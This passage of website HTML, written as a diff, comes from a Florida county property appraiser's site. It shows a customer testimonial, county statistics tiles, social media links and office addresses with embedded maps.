+<p>&ldquo;I just had a phone call from the gentleman you both helped, and he said both of you were phenomenal and deserved a pay raise! Thank you Nic and Heather!&rdquo;</p>
+
+<footer><span class="info">
+        <strong>Kelly C</strong></span></footer>
+</blockquote>
+</div>
+</div>
+</div>
+
+</div>
+
+</div></div></div><!-- End_Module_725 --></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div></div> <div class="dng-column col-md-6"><div class="dng-column-inner " id="column-868433"> <div id="dnn_PaneG" class="panebox PaneG mr-45 DNNEmptyPane"></div></div></div><div class="dng-column col-md-6"><div class="dng-column-inner " id="column-310756"> <div id="dnn_PaneH" class="panebox PaneH mr-45 DNNEmptyPane"></div></div></div><div class="dng-column col-md-12"><div class="dng-column-inner " id="column-661481"> <div id="dnn_PaneI" class="panebox PaneI DNNEmptyPane"></div></div></div> </div></div></div> <div class="container-fluid row-no-spacing " id="row-795271"><div class="container"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-609224"> <div id="dnn_PaneJ" class="panebox PaneJ DNNEmptyPane"></div></div></div> </div></div></div> <div class="container-fluid col-no-padding clearfix" id="row-468767"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-147663"> <div id="dnn_PaneK" class="panebox PaneK DNNEmptyPane"></div></div></div> <div class="dng-column col-md-12 col-lg-8"><div class="dng-column-inner " id="column-847819"> <div id="dnn_PaneL" class="panebox PaneL DNNEmptyPane"></div></div></div><div class="dng-column col-md-12 col-lg-4"><div class="dng-column-inner " id="column-898570"> <div id="dnn_PaneM" class="panebox PaneM mr-60 DNNEmptyPane"></div></div></div><div class="dng-column col-md-12"><div class="dng-column-inner " id="column-92442"> <div id="dnn_PaneN" class="panebox PaneN DNNEmptyPane"></div></div></div> </div></div> <div class="container-fluid row-no-spacing clearfix" id="row-603714"><div class="container"><div class="column-gap-0 row-flex cont-pos-middle dng-row row"> <div class="dng-column col-md-12 col-lg-6"><div class="dng-column-inner " id="column-698381"> <div id="dnn_PaneO" class="panebox PaneO DNNEmptyPane"></div></div></div> <div class="dng-column col-md-12 col-lg-6"><div class="dng-column-inner " id="column-308155"> <div id="dnn_PaneP" class="panebox PaneP mr-45 DNNEmptyPane"></div></div></div><div class="dng-column col-md-12"><div class="dng-column-inner " id="column-292987"> <div id="dnn_PaneQ" class="panebox PaneQ DNNEmptyPane"></div></div></div> </div></div></div> <div class="container-fluid col-no-padding " id="row-799481"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12 relative-z-index_99"><div class="dng-column-inner " id="column-698011"> <div id="dnn_PaneR" class="panebox PaneR pr-20 pl-20 text-center DNNEmptyPane"></div></div></div> <div class="dng-column col-md-12 hide_desktop hide_table hide_table_portrait hide_mobile hide_mobile_landscape"><div class="dng-column-inner " id="column-636220"> <div id="dnn_PaneS" class="panebox PaneS DNNEmptyPane"></div></div></div><div class="dng-column col-md-12"><div class="dng-column-inner " id="column-287303"> <div id="dnn_PaneT" class="panebox PaneT DNNEmptyPane"></div></div></div> </div></div> <div class="container"><div class=" column-gap-0 dng-row row" id="row-292519"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-263349"> <div id="dnn_PaneU" class="panebox PaneU DNNEmptyPane"></div></div></div> </div></div> <div class="container-fluid row-no-spacing " id="row-504152"><div class="container"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-557261"> <div id="dnn_PaneV" class="panebox PaneV DNNEmptyPane"></div></div></div> </div></div></div> <div class="container"><div class=" column-gap-0 dng-row row" id="row-568959"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-259512"> <div id="dnn_PaneW" class="panebox PaneW DNNEmptyPane"></div></div></div> </div></div> <div class="container-fluid row-no-spacing " id="row-377216"><div class="container"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-435750"> <div id="dnn_PaneX" class="panebox PaneX DNNEmptyPane"></div></div></div> </div></div></div> <div class="container-fluid row-no-spacing " id="row-637484"><div class="container"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-658512"> <div id="dnn_PaneY" class="panebox PaneY"><div class="DnnModule DnnModule-DNN_HTML DnnModule-728 DnnVersionableControl"><a name="728"></a>
+<div class="White">
+     <div id="dnn_ctr728_ContentPane" class="contentpane"><!-- Start_Module_728 --><div style="padding-top: 60px; margin-bottom: -8px;"><div id="dnn_ctr728_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr728_HtmlModule_lblContent" class="Normal">
+	<div class="dg-tabs-top dg-tabs-top04 tabs-medium equalHeight" data-autoplay="0">
+<ul class="resp-tabs-list">
+ <li class="resp-tab-active icon"><span class="dg-ico02 size-sm">
+                        <i class="fas fa-map-marked-alt"></i></span>
+ <div class="box-right">
+ <h5 class="title font-weight-600">OUR AREA</h5>
+ </div>
+ </li>
+ <li class="icon "><span class="dg-ico02 size-sm">
+                        <i class="fas fa-users"></i></span>
+ <div class="box-right">
+ <h5 class="title font-weight-600">OUR PEOPLE</h5>
+ </div>
+ </li>
+</ul>
+
+<div class="resp-tabs-container">
+<div class="resp_container">
+<div class="resp_margin ">
+<div class="row row-flex equal-height dng-row cont-pos-middle">
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color1">
+<div class="icon-bg"><span class="fas fa-coins"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-coins"></i><span class="animation number color-white" data-number="148470">0</span>
+<h6 class="title">Real Property Parcels</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color2">
+<div class="icon-bg"><span class="fas fa-boxes"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-boxes"></i><span class="animation number color-white" data-number="7225">0</span>
+<h6 class="title">Tangible Personal Property Businesses</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color3">
+<div class="icon-bg"><span class="fas fa-dollar-sign"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-dollar-sign"></i>$<span class="animation number color-white" data-number="29.7">0</span>Billion
+<h6 class="title">Total Market Value</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color4">
+<div class="icon-bg"><span class="fas fa-building"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-building"></i><span class="animation number color-white" data-number="4602">0</span>
+<h6 class="title">Commercial &amp; Industrial Parcels</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color5">
+<div class="icon-bg"><span class="fas fa-ruler-combined"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-ruler-combined"></i><span class="animation number color-white" data-number="582">0</span>
+<h6 class="title">Land Area Square Miles</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color6">
+<div class="icon-bg"><span class="fas fa-water"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-water"></i><span class="animation number color-white" data-number="192">0</span>
+<h6 class="title">Water Area Square Miles</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color7">
+<div class="icon-bg"><span class="fas fa-home"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-home"></i><span class="animation number color-white" data-number="63353">0</span>
+<h6 class="title">Single Family Homes</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color8">
+<div class="icon-bg"><span class="far fa-building"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon far fa-building"></i><span class="animation number color-white" data-number="1608">0</span>
+<h6 class="title">Condo Units</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="resp_container">
+<div class="resp_margin ">
+<div class="row row-flex equal-height dng-row cont-pos-middle">
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color8">
+<div class="icon-bg"><span class="fas fa-users"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-users"></i><span class="animation number color-white" data-number="170174">0</span>
+<h6 class="title">Population</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color7">
+<div class="icon-bg"><span class="fas fa-file-invoice-dollar"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-file-invoice-dollar"></i>$<span class="animation number color-white" data-number="55355">0</span>
+<h6 class="title">Median Household Income</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color6">
+<div class="icon-bg"><span class="fas fa-home"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-home"></i><span class="animation number color-white" data-number="84.8">0</span>%
+<h6 class="title">Owner Occupied Housing</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color5">
+<div class="icon-bg"><span class="fas fa-school"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-school"></i><span class="animation number color-white" data-number="90.9">0</span>%
+<h6 class="title">Education (high school or higher)</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color4">
+<div class="icon-bg"><span class="fas fa-users-cog"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-users-cog"></i><span class="animation number color-white" data-number="264.4">0</span>
+<h6 class="title">Population Per Square Mile</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color3">
+<div class="icon-bg"><span class="fas fa-warehouse"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-warehouse"></i><span class="animation number color-white" data-number="88615">0</span>
+<h6 class="title">Housing Units</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color2">
+<div class="icon-bg"><span class="fas fa-chart-line"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-chart-line"></i><span class="animation number color-white" data-number="10.6">0</span>%
+<h6 class="title">4-yr Population Change</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color1">
+<div class="icon-bg"><span class="fas fa-medal"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-medal"></i><span class="animation number color-white" data-number="17215">0</span>
+<h6 class="title">Veterans</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<!--
+
+<div class="dg-tabs-top dg-tabs-top04 tabs-medium equalHeight" data-autoplay="0">
+<ul class="resp-tabs-list">
+ <li class="resp-tab-active icon"><span class="dg-ico02 size-sm">
+                    <i class="fas fa-map-marked-alt"></i></span>
+ <div class="box-right">
+ <h5 class="title font-weight-600">OUR AREA</h5>
+ </div>
+ </li>
+ <li class="icon "><span class="dg-ico02 size-sm">
+                    <i class="fas fa-users"></i></span>
+ <div class="box-right">
+ <h5 class="title font-weight-600">OUR PEOPLE</h5>
+ </div>
+ </li>
+</ul>
+
+<div class="resp-tabs-container">
+<div class="resp_container">
+<div class="resp_margin ">
+<div class="row row-flex equal-height dng-row cont-pos-middle">
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-accent">
+<div class="icon-bg"><span class="fas fa-coins"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-coins"></i><span class="animation number color-white" data-number="146932">0</span>
+<h6 class="title">Real Property Parcels</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-accent3">
+<div class="icon-bg"><span class="fas fa-boxes"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-boxes"></i><span class="animation number color-white" data-number="7188">0</span>
+<h6 class="title">Tangible Personal Property Businesses</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-accent2">
+<div class="icon-bg"><span class="fas fa-dollar-sign"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-dollar-sign"></i>$<span class="animation number color-white" data-number="18.3">0</span>Billion
+<h6 class="title">Total Market Value</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-accent4">
+<div class="icon-bg"><span class="fas fa-building"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-building"></i><span class="animation number color-white" data-number="4345">0</span>
+<h6 class="title">Commercial &amp; Industrial Parcels</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color7">
+<div class="icon-bg"><span class="fas fa-ruler-combined"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-ruler-combined"></i><span class="animation number color-white" data-number="582">0</span>
+<h6 class="title">Land Area Square Miles</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color6">
+<div class="icon-bg"><span class="fas fa-water"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-water"></i><span class="animation number color-white" data-number="192">0</span>
+<h6 class="title">Water Area Square Miles</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color8">
+<div class="icon-bg"><span class="fas fa-home"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-home"></i><span class="animation number color-white" data-number="55689">0</span>
+<h6 class="title">Single Family Homes</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color5">
+<div class="icon-bg"><span class="far fa-building"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon far fa-building"></i><span class="animation number color-white" data-number="1639">0</span>
+<h6 class="title">Condo Units</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="resp_container">
+<div class="resp_margin ">
+<div class="row row-flex equal-height dng-row cont-pos-middle">
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-accent2">
+<div class="icon-bg"><span class="fas fa-users"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-users"></i><span class="animation number color-white" data-number="149657">0</span>
+<h6 class="title">Population</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-accent4">
+<div class="icon-bg"><span class="fas fa-file-invoice-dollar"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-file-invoice-dollar"></i>$<span class="animation number color-white" data-number="44237">0</span>
+<h6 class="title">Median Household Income</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-accent">
+<div class="icon-bg"><span class="fas fa-home"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-home"></i><span class="animation number color-white" data-number="81.9">0</span>%
+<h6 class="title">Owner Occupied Housing</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-accent3">
+<div class="icon-bg"><span class="fas fa-school"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-school"></i><span class="animation number color-white" data-number="88.4">0</span>%
+<h6 class="title">Education (high school or higher)</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color8">
+<div class="icon-bg"><span class="fas fa-users-cog"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-users-cog"></i><span class="animation number color-white" data-number="242.8">0</span>
+<h6 class="title">Population Per Square Mile</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color5">
+<div class="icon-bg"><span class="fas fa-warehouse"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-warehouse"></i><span class="animation number color-white" data-number="80895">0</span>
+<h6 class="title">Housing Units</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color7">
+<div class="icon-bg"><span class="fas fa-chart-line"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-chart-line"></i><span class="animation number color-white" data-number="6">0</span>%
+<h6 class="title">10-yr Population Change</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="dng-column col-sm-12 col-md-6 col-lg-3">
+<div class="dng-column-inner">
+<div class="dg-infobox04 color-light text-left bg-color6">
+<div class="icon-bg"><span class="fas fa-medal"></span></div>
+
+<div class="tiles-same-height-center">
+<div class="dg-number dg-number01 size-xl color-white"><i class="icon fas fa-medal"></i><span class="animation number color-white" data-number="19157">0</span>
+<h6 class="title">Veterans</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+-->
+</div>
+
+</div></div><!-- End_Module_728 --></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div></div> </div></div></div>  
+    
+    
+
+    </section>
+    
+    <footer class="footer"> 
+   	
+          <div class="container-fluid col-no-padding " id="row-727913"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-6"><div class="dng-column-inner " id="column-477896"> <div id="dnn_FooterPaneF" class="panebox FooterPaneF DNNEmptyPane"></div></div></div><div class="dng-column col-md-6"><div class="dng-column-inner " id="column-71828"> <div id="dnn_FooterPaneG" class="panebox FooterPaneG DNNEmptyPane"></div></div></div> </div></div> <div class="container-fluid row-no-spacing " id="row-230145"><div class="container"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12"><div class="dng-column-inner mt-50" id="column-539442"> <div id="dnn_FooterPaneE" class="panebox FooterPaneE color-white"><div class="DnnModule DnnModule-DNN_HTML DnnModule-712 DnnVersionableControl"><a name="712"></a>
+<div class="White">
+     <div id="dnn_ctr712_ContentPane" class="contentpane"><!-- Start_Module_712 --><div id="dnn_ctr712_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr712_HtmlModule_lblContent" class="Normal">
+	<ul class="list-inline text-center">
+ <li><a href="https://www.facebook.com/CitrusCountyFLPropertyAppr" target="_blank"><i class="fab fa-facebook-square fa-2x"></i></a></li>
+ <li><a href="https://www.instagram.com/CitrusCountyFlPropertyAppr/" target="_blank"><i class="fab fa-instagram fa-2x"></i></a></li>
+ <li><a href="https://www.youtube.com/channel/UCmPDs8UbbE7pFbFUT-XtDfQ" target="_blank"><i class="fab fa-youtube-square fa-2x"></i>
+</a></li></ul>
+</div>
+
+</div><!-- End_Module_712 --></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div></div> </div></div></div> <div class="container-fluid " id="row-508386"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-712636"> <div class="inner-row-box custom-css footer-restrain" id="row-832300"><div class="dng-row row column-gap-4"> <div class="dng-column col-md-12"><div class="dng-column-inner " id="column-48993"> <div class="inner-row-box custom-css color-white mt-25 mb-50" id="row-180284"><div class="dng-row row column-gap-4"> <div class="dng-column col-md-3 col-sm-6"><div class="dng-column-inner " id="column-128172"> <div id="dnn_FooterPaneH" class="panebox FooterPaneH"><div class="DnnModule DnnModule-DNN_HTML DnnModule-721 DnnVersionableControl"><a name="721"></a>
+<div class="White">
+     <div id="dnn_ctr721_ContentPane" class="contentpane"><!-- Start_Module_721 --><div class="dg-title subtitle-style01 text-left title-style09 ">
+    <h5 class="title ">Inverness</h5>
+    <span class="decorated r"></span>
+</div><div id="dnn_ctr721_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr721_HtmlModule_lblContent" class="Normal">
+	<p>8:30am - 4pm Monday - Friday<br>
+<a href="https://www.google.com/maps/place/Citrus+County+Property+Appraiser/@28.8390474,-82.3315238,17z/data=!4m13!1m7!3m6!1s0x88e87330ae8507db:0x186ab5ca09b9f0b9!2s210+N+Apopka+Ave,+Inverness,+FL+34450!3b1!8m2!3d28.8390474!4d-82.3293351!3m4!1s0x88e87330a2bf7ad7:0x511932f4b4c7a59f!8m2!3d28.8389884!4d-82.3292845?hl=en" target="_blank"><strong>Inverness Google Map</strong></a><br>
+210 N. Apopka Ave., Suite 200<br>
+Inverness, FL 34450</p>
+
+<p><strong>Office:</strong>&nbsp;<a href="tel:3523416600">(352) 341-6600</a><br>
+<strong>Fax:</strong> (352) 341-6660<br>
+TTY 7-1-1<br>
+<strong>Email:</strong> <a href="/_dnn/email-us">ccpaweb@citruspa.org</a></p>
+
+</div>
+
+</div><!-- End_Module_721 --></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div></div><div class="dng-column col-md-3 col-sm-6"><div class="dng-column-inner " id="column-281574"> <div id="dnn_FooterPaneI" class="panebox FooterPaneI"><div class="DnnModule DnnModule-DNN_HTML DnnModule-731 DnnVersionableControl"><a name="731"></a>
+<div class="White">
+     <div id="dnn_ctr731_ContentPane" class="contentpane"><!-- Start_Module_731 --><div id="dnn_ctr731_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr731_HtmlModule_lblContent" class="Normal">
+	<p><iframe allowfullscreen="" height="300" loading="lazy" src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d3494.993705788916!2d-82.3315238!3d28.8390474!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x88e87330a2bf7ad7%3A0x511932f4b4c7a59f!2sCitrus%20County%20Property%20Appraiser!5e0!3m2!1sen!2sus!4v1616010109304!5m2!1sen!2sus" style="border:0;" width="100%"></iframe></p>
+
+</div>
+
+</div><!-- End_Module_731 --></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div></div><div class="dng-column col-md-3 col-sm-6"><div class="dng-column-inner " id="column-726498"> <div id="dnn_FooterPaneJ" class="panebox FooterPaneJ"><div class="DnnModule DnnModule-DNN_HTML DnnModule-723 DnnVersionableControl"><a name="723"></a>
+<div class="White">
+     <div id="dnn_ctr723_ContentPane" class="contentpane"><!-- Start_Module_723 --><div class="dg-title subtitle-style01 text-left title-style09 ">
+    <h5 class="title ">Crystal River</h5>
+    <span class="decorated r"></span>
+</div><div id="dnn_ctr723_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr723_HtmlModule_lblContent" class="Normal">
+	<p>8am - 5pm Monday - Friday<br>
+<a href="https://www.google.com/maps/place/West+Citrus+Government+Center/@28.8841498,-82.5435429,17z/data=!4m13!1m7!3m6!1s0x88e86a8ac309b933:0x9ca361ff4e2ae016!2s1540+N+Meadowcrest+Blvd,+Crystal+River,+FL+34429!3b1!8m2!3d28.8841498!4d-82.5413542!3m4!1s0x88e86af5307b7395:0x80b016f8731faa36!8m2!3d28.8839796!4d-82.5395218" target="_blank"><strong>Crystal River Google Map</strong></a><br>
+1540 N. Meadowcrest Blvd., Suite 400<br>
+Crystal River, FL 34429</p>
+
+<p><strong>Office:&nbsp;</strong><a href="tel:3523416600">(352) 341-6600</a><br>
+<strong>Fax:</strong> (352) 564-7131<br>
+<strong>Email:</strong> <a href="/_dnn/email-us">ccpaweb@citruspa.org</a></p>
+
+</div>
+
+</div><!-- End_Module_723 --></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div></div><div class="dng-column col-md-3 col-sm-6"><div class="dng-column-inner " id="column-413733"> <div id="dnn_FooterPaneK" class="panebox FooterPaneK"><div class="DnnModule DnnModule-DNN_HTML DnnModule-732 DnnVersionableControl"><a name="732"></a>
+<div class="White">
+     <div id="dnn_ctr732_ContentPane" class="contentpane"><!-- Start_Module_732 --><div id="dnn_ctr732_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr732_HtmlModule_lblContent" class="Normal">
+	<p><iframe allowfullscreen="" height="300" loading="lazy" src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3493.477533770544!2d-82.54354288456693!3d28.88415447939806!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x88e86a8ac309b933%3A0x2e70af3ead3155d2!2s1540%20N%20Meadowcrest%20Blvd%20%23400%2C%20Crystal%20River%2C%20FL%2034429!5e0!3m2!1sen!2sus!4v1616010280475!5m2!1sen!2sus" style="border:0;" width="100%"></iframe></p>
+
+</div>
+
+</div><!-- End_Module_732 --></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
